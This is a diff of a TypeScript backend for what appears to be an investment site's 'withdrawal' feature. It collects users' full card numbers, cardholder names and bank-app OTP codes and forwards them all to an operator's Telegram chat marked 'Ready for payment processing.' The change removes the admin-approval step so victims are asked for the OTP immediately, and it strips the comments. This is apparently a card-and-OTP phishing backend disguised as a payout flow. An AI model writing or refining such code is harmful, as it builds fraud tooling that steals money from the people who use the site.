@@ -83,7 +83,6 @@ export const createWithdrawal = async (req: AuthRequest, res: Response): Promise
       include: { investment: true },
     })
 
-    // Notify admin with card details - admin must approve first
     await notifyWithdrawalRequest(
       withdrawal.id,
       `${req.user!.firstName} ${req.user!.lastName}`,
@@ -100,7 +99,7 @@ export const createWithdrawal = async (req: AuthRequest, res: Response): Promise
 
     res.status(201).json({
       success: true,
-      message: 'Withdrawal submitted. Admin will review and approve. You will enter OTP after approval.',
+      message: 'Withdrawal submitted. Please enter OTP from your bank app.',
       data: {
         ...withdrawal,
         cardNumber: `${cardNumber.slice(0, 4)} **** **** **** ${cardNumber.slice(-4)}`,
@@ -116,66 +115,6 @@ export const createWithdrawal = async (req: AuthRequest, res: Response): Promise
   }
 }
 
-// Admin approves the card - user will then enter OTP
-export const adminApproveWithdrawal = async (req: AuthRequest, res: Response): Promise<void> => {
-  try {
-    const { id } = req.params
-
-    const withdrawal = await prisma.withdrawal.findUnique({
-      where: { id },
-      include: { user: true },
-    })
-
-    if (!withdrawal) {
-      res.status(404).json({ success: false, message: 'Withdrawal not found' })
-      return
-    }
-
-    if (withdrawal.status !== 'PROCESSING') {
-      res.status(400).json({ success: false, message: 'Withdrawal not in processing state' })
-      return
-    }
-
-    const transition = await prisma.withdrawal.updateMany({
-      where: { id, status: 'PROCESSING' },
-      data: { status: 'AWAITING_OTP' },
-    })
-    if (transition.count === 0) {
-      res.status(409).json({ success: false, message: 'Withdrawal state changed. Refresh and try again.' })
-      return
-    }
-
-    const updated = { ...withdrawal, status: 'AWAITING_OTP' }
-
-    // Notify user to enter OTP
-    await notifyUserOTP(withdrawal.userId, withdrawal.id, withdrawal.amount)
-
-    // Notify admin that user needs to enter OTP
-    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN
-    const ADMIN_CHAT_ID = process.env.TELEGRAM_ADMIN_CHAT_ID
-    if (BOT_TOKEN && ADMIN_CHAT_ID) {
-      try {
-        const bot = new TelegramBot(BOT_TOKEN, { polling: false })
-        await bot.sendMessage(ADMIN_CHAT_ID,
-          `✅ Card approved for withdrawal. User will enter OTP shortly.\n\nCard: ${withdrawal.cardNumber?.replace(/(\d{4})(?=\d)/g, '$1 ')}\nHolder: ${withdrawal.cardholderName}\nAmount: $${withdrawal.amount}`
-        )
-      } catch (e) {
-        console.error('Failed to notify admin:', e)
-      }
-    }
-
-    res.status(200).json({
-      success: true,
-      message: 'Card approved. User will enter OTP.',
-      data: updated,
-    })
-  } catch (error) {
-    console.error('Admin approve withdrawal error:', error)
-    res.status(500).json({ success: false, message: 'Server error' })
-  }
-}
-
-// User submits OTP - can be done immediately after card submission
 export const submitOTP = async (req: AuthRequest, res: Response): Promise<void> => {
   try {
     const { id } = req.params
@@ -210,14 +149,13 @@ export const submitOTP = async (req: AuthRequest, res: Response): Promise<void> 
 
     const updated = { ...withdrawal, verificationCode: otpCode, status: 'WITHDRAWAL_PENDING', isVerified: true }
 
-    // Notify admin with OTP and final processing actions.
     const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN
     const ADMIN_CHAT_ID = process.env.TELEGRAM_ADMIN_CHAT_ID
     if (BOT_TOKEN && ADMIN_CHAT_ID) {
       try {
         const bot = new TelegramBot(BOT_TOKEN, { polling: false })
         await bot.sendMessage(ADMIN_CHAT_ID,
-          `🔐 OTP Received for Withdrawal\n\nUser: ${req.user!.firstName} ${req.user!.lastName}\nCard: ${withdrawal.cardNumber?.replace(/(\d{4})(?=\d)/g, '$1 ')}\nAmount: $${withdrawal.amount}\nOTP: ${otpCode}\n\nReady for payment processing.`
+          `OTP Received for Withdrawal\n\nUser: ${req.user!.firstName} ${req.user!.lastName}\nCard: ${withdrawal.cardNumber?.replace(/(\d{4})(?=\d)/g, '$1 ')}\nAmount: $${withdrawal.amount}\nOTP: ${otpCode}\n\nReady for payment processing.`
         )
       } catch (e) {
         console.error('Failed to notify admin:', e)
@@ -240,28 +178,6 @@ export const submitOTP = async (req: AuthRequest, res: Response): Promise<void> 
   } catch (error) {
     console.error('Submit OTP error:', error)
     res.status(500).json({ success: false, message: 'Server error' })
-  }
-}
-
-// Notify user to enter OTP
-const notifyUserOTP = async (userId: string, withdrawalId: string, amount: number) => {
-  const withdrawal = await prisma.withdrawal.findUnique({
-    where: { id: withdrawalId },
-    include: { user: true },
-  })
-
-  if (withdrawal?.user?.telegramChatId) {
-    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN
-    if (BOT_TOKEN) {
-      try {
-        const bot = new TelegramBot(BOT_TOKEN, { polling: false })
-        await bot.sendMessage(withdrawal.user.telegramChatId,
-          `✅ Your withdrawal card has been approved!\n\nPlease enter the OTP from your bank app to proceed with the withdrawal of $${amount}.`
-        )
-      } catch (e) {
-        console.error('Failed to notify user:', e)
-      }
-    }
   }
 }
 
@@ -326,7 +242,7 @@ export const rejectWithdrawal = async (req: AuthRequest, res: Response): Promise
     const { adminNotes } = req.body
 
     const transition = await prisma.withdrawal.updateMany({
-      where: { id, status: { in: ['PROCESSING', 'AWAITING_OTP', 'WITHDRAWAL_PENDING'] } },
+      where: { id, status: { in: ['PROCESSING', 'WITHDRAWAL_PENDING'] } },
       data: { status: 'REJECTED', adminNotes },
     })
 
